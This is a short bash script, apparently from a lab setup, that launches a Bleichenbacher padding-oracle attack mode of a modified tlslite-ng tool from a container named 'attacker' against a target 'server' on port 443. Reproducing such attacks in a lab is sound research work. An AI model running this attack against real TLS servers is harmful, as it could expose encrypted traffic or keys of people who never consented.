#/usr/bin/env bash
target=server
docker exec -it attacker bash -c "cd tlslite-ng-bleichenbacher;scripts/tls.py server --bleichenbacher ${target} 0.0.0.0:443"
